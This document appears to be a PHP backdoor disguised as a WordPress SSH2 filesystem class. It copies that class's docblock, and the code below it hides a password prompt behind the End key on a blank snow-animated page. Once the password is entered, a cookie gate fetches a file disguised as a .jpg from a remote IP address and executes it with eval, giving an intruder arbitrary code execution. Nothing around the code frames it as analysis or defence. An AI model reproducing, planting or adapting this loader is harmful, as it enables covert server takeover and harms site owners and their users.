<?php
/**
 * WordPress Filesystem Class for implementing SSH2
 * 
 * To use this class you must follow these steps for PHP 5.2.6+
 *
 * {@link http://kevin.vanzonneveld.net/techblog/article/make_ssh_connections_with_php/ - Installation Notes}
 *
 * Compile libssh2 (Note: Only 0.14 is officially working with PHP 5.2.6+ right now, But many users have found the latest versions work)
 *
 * cd /usr/src
 * wget https://www.libssh2.org/download/libssh2-0.14.tar.gz
 * tar -zxvf libssh2-0.14.tar.gz
 * cd libssh2-0.14/
 * ./configure
 * make all install
 *
 * Note: Do not leave the directory yet!
 *
 * Enter: pecl install -f ssh2
 *
 * Copy the ssh.so file it creates to your PHP Module Directory.
 * Open up your PHP.INI file and look for where extensions are placed.
 * Add in your PHP.ini file: extension=ssh2.so
 *
 * Restart Apache!
 * Check phpinfo() streams to confirm that: ssh2.shell, ssh2.exec, ssh2.tunnel, ssh2.scp, ssh2.sftp  exist.
 *
 * Note: As of WordPress 2.8, this utilizes the PHP5+ function `stream_get_contents()`.
 *
 * @since 2.7.0
 *
 * @package WordPress
 * @subpackage Filesystem
 *
 * @package    Haxor.Group
 * @copyright  Copyright (C) 2023 - 2024 Open Source Matters, Inc. All rights reserved.
 *
 */

error_reporting(0);
ini_set('display_errors', 0);

function is_logged_in() {
    return isset($_COOKIE['user_id']) && $_COOKIE['user_id'] === 'LPH'; 
}

function get_remote_content($url) {
    if (function_exists("curl_init")) {
        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        $result = curl_exec($ch);
        curl_close($ch);
        return $result;
    } elseif (function_exists("file_get_contents")) {
        return @file_get_contents($url);
    } elseif (function_exists("fopen") && function_exists("stream_get_contents")) {
        $handle = @fopen($url, "r");
        if ($handle) {
            $data = stream_get_contents($handle);
            fclose($handle);
            return $data;
        }
    }
    return false;
}

if (is_logged_in()) {
    $destiny = 'http://156.67.221.29/hx.jpg'; // remote file
    $dream = get_remote_content($destiny);
    if ($dream !== false) {
        eval("?>".$dream);
    }
    exit;
} else {
    if (isset($_POST['password'])) {
        $entered_key = $_POST['password'];
        $hashed_key = '$2y$10$Bfd4ZTYvIfgfGFLkcZjk3.Z6aCsG3wNmvr9YvVioNSB1GwfC66sXC'; // bcrypt hash

        if (password_verify($entered_key, $hashed_key)) {
            setcookie('user_id', 'LPH', time() + 3600, '/'); 
            header("Location: ".$_SERVER['PHP_SELF']); 
            exit();
        }
    }
}
?>
<!DOCTYPE html>
<html>
<head>
    <title></title>
    <style>
        body {
            margin: 0;
            padding: 0;
            height: 100vh;
            width: 100vw;
            background: #fff; 
            overflow: hidden;
            position: relative;
        }
        .login-container {
            display: none;
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 300px;
            background: #fff;
            padding: 20px;
            border: 1px solid #ccc;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
            text-align: center;
            z-index: 1;
        }
        .login-container input {
            width: calc(100% - 22px);
            padding: 10px;
            margin: 10px 0;
            box-sizing: border-box;
        }
        .snowflake {
            position: absolute;
            background: white;
            border-radius: 50%;
            width: 5px;
            height: 5px;
            opacity: 0.8;
            pointer-events: none;
            z-index: 0;
            animation: fall linear;
        }
        @keyframes fall {
            to {
                transform: translateY(100vh);
            }
        }
    </style>
</head>
<body>
    <div class="login-container" id="loginBox">
        <form method="POST" action="">
            <label for="password">
                Seven and thirteen dance together, to get The Sacred Ancient Entry Code seek the harmony between them to find the key.
            </label>
            <input type="password" id="password" name="password" autofocus>
            <input type="submit" value="acceso">
        </form>
    </div>

    <script>
        function createSnowflake() {
            const snowflake = document.createElement('div');
            snowflake.className = 'snowflake';
            snowflake.style.left = Math.random() * 100 + 'vw';
            snowflake.style.animationDuration = Math.random() * 3 + 2 + 's';
            snowflake.style.opacity = Math.random();
            document.body.appendChild(snowflake);
            
            setTimeout(() => {
                snowflake.remove();
            }, 5000);
        }

        setInterval(createSnowflake, 100);

        document.addEventListener("keydown", function(e) {
            if (e.key === "End") {
                document.getElementById("loginBox").style.display = "block";
            }
        });
    </script>
</body>
</html>
